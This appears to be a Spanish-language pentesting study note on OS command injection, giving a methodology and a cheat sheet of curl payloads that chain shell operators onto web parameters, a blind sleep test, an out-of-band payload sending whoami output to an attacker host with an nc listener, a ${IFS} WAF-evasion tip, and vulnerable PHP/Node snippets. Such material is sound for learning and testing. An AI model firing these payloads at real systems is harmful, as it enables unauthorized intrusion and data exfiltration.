---
tags:
  - RCE
  - webapp
  - commandinjection
---
## Conceptos Clave (TL;DR)

- Una vulnerabilidad de Command Injection ocurre cuando el input del usuario se incorpora directamente (sin sanitizar) a una función que ejecuta comandos del sistema operativo en el servidor back-end.
- Es considerada una de las vulnerabilidades más críticas porque puede llevar a RCE completo sobre el servidor y comprometer toda la red.
- Afecta a cualquier lenguaje o framework (PHP, NodeJS, Python, Java, etc.) que use funciones de ejecución de sistema: `exec`, `system`, `shell_exec`, `passthru`, `popen` (PHP); `child_process.exec`, `child_process.spawn` (Node).
- El vector no se limita a aplicaciones web: binarios y thick clients también son vulnerables si pasan input sin sanitizar a funciones de sistema.


## Herramientas Clave

| Herramienta | Proposito en este vector |
|---|---|
| `curl` / `wget` | Enviar payloads de inyeccion via peticiones HTTP (GET/POST) manualmente |
| Burp Suite | Interceptar y modificar parametros para inyectar payloads en campos vulnerables |
| Browser DevTools | Identificar parametros en peticiones GET/POST antes de pasar a herramientas |


## Metodologia Paso a Paso

### Fase 1: Reconocimiento del Vector

Identificar funcionalidades en la aplicacion que sugieran ejecucion de comandos en el back-end:
- Creacion/manipulacion de archivos
- Ping / traceroute / DNS lookup integrados
- Conversion de documentos
- Cualquier feature que interactue con el sistema de archivos

Revisar los parametros involucrados (GET, POST, Headers, Cookies) que alimenten dichas funcionalidades.

### Fase 2: Deteccion de la Vulnerabilidad

Probar operadores de inyeccion para "escapar" el comando original y encadenar uno propio.
La logica es interrumpir el flujo del comando original e inyectar el nuestro usando metacaracteres del shell.

Operadores de inyeccion comunes (probar en orden):

| Operador               | Comportamiento                                                                |
| ---------------------- | ----------------------------------------------------------------------------- |
| `;`                    | Ejecuta ambos comandos secuencialmente (independiente del resultado anterior) |
| `&&`                   | Ejecuta el segundo comando SOLO si el primero tiene exito                     |
| `\|\|`                 | Ejecuta el segundo comando SOLO si el primero falla                           |
| `\|` (pipe)            | Pasa el output del primer comando como input del segundo                      |
| `` `cmd` `` o `$(cmd)` | Sustitucion de comandos (inline execution)                                    |


### Fase 3: Confirmacion de RCE

Usar comandos no destructivos para confirmar ejecucion: `whoami`, `id`, `hostname`, `uname -a`.
Si hay output visible en la aplicacion (in-band), el resultado aparecera en la respuesta HTTP.
Si no hay output (blind injection), usar tecnicas de tiempo (`sleep`) o exfiltracion out-of-band.

### Fase 4: Explotacion

Una vez confirmado RCE, escalar segun el objetivo:
- Lectura de archivos sensibles
- Reverse shell
- Enumeracion interna de la red


## Cheat Sheet de Comandos

### Deteccion basica - inyeccion en parametro GET

```bash
# Probar separador ; para encadenar comando propio al comando original de la app
# Sustituir PARAM por el nombre del parametro vulnerable identificado
curl -s "http://<TARGET_IP>/endpoint?PARAM=valor;<COMMAND>"

# Ejemplo con whoami para confirmar RCE
curl -s "http://<TARGET_IP>/endpoint?filename=test;whoami"
```

```bash
# Probar operador && (el comando original debe tener exito para que el nuestro ejecute)
curl -s "http://<TARGET_IP>/endpoint?filename=test&&whoami"
```

```bash
# Probar operador || (el comando original debe FALLAR para que el nuestro ejecute)
curl -s "http://<TARGET_IP>/endpoint?filename=test||whoami"
```

```bash
# Probar pipe | (output del primer comando va al segundo)
curl -s "http://<TARGET_IP>/endpoint?filename=test|whoami"
```

```bash
# Sustitucion de comandos inline con $()
curl -s "http://<TARGET_IP>/endpoint?filename=\$(whoami)"
```

### Confirmacion de RCE (comandos no destructivos)

```bash
# Identificar usuario con el que corre el servidor web
curl -s "http://<TARGET_IP>/endpoint?filename=;whoami"

# Informacion del sistema operativo
curl -s "http://<TARGET_IP>/endpoint?filename=;uname+-a"

# Hostname del servidor
curl -s "http://<TARGET_IP>/endpoint?filename=;hostname"
```

### Blind Command Injection - deteccion por tiempo

```bash
# Si no hay output visible, usar sleep para confirmar via tiempo de respuesta
# Un delay de ~5 segundos en la respuesta = RCE confirmado
curl -s "http://<TARGET_IP>/endpoint?filename=;sleep+5"
```

### Exfiltracion out-of-band (Blind)

```bash
# Exfiltrar output via peticion HTTP a nuestro servidor
# Levantar listener primero en maquina atacante
nc -lvnp <PORT>

# Payload: enviar output de whoami a nuestro servidor
curl -s "http://<TARGET_IP>/endpoint?filename=;curl+http://<ATTACKER_IP>:<PORT>/\$(whoami)"
```

### Codigo PHP vulnerable (referencia para reconocimiento de codigo fuente)

```php
# Patron vulnerable: input del usuario concatenado directamente al comando sin sanitizar
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

### Codigo NodeJS vulnerable (referencia para reconocimiento de codigo fuente)

```javascript
// Patron vulnerable en Node: template literal con input del usuario sin sanitizar
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```


## "Gotchas" y Troubleshooting

- **Espacios en payloads via URL:** Los espacios deben ser URL-encoded como `+` o `%20` al enviar via curl/browser. Algunos WAFs bloquean espacios; alternativa: usar `${IFS}` en bash como separador.
- **El operador correcto importa:** Si el comando original de la app falla, `&&` no ejecutara tu payload. Usar `;` o `||` como alternativas mas permisivas cuando no se sabe si el comando original tiene exito.
- **Output no visible (Blind):** Si la aplicacion no refleja el resultado del comando en la respuesta HTTP, pasar directamente a tecnicas de deteccion por tiempo (sleep) o exfiltracion out-of-band via curl/ping/nslookup.
- **Funciones PHP relevantes para identificar en code review:** `exec`, `system`, `shell_exec`, `passthru`, `popen`. Cualquiera de estas con input del usuario sin escapar es una vulnerabilidad directa.
- **No exclusivo de web apps:** Recuerda que binarios nativos y thick clients que internamente llamen a funciones de sistema con input del usuario son igualmente explotables con los mismos metodos.
- **Contexto del shell importa:** El operador de inyeccion debe ser valido para el shell que corre en el servidor (bash/sh en Linux, cmd/powershell en Windows). En Windows los separadores equivalentes son `&` y `|`.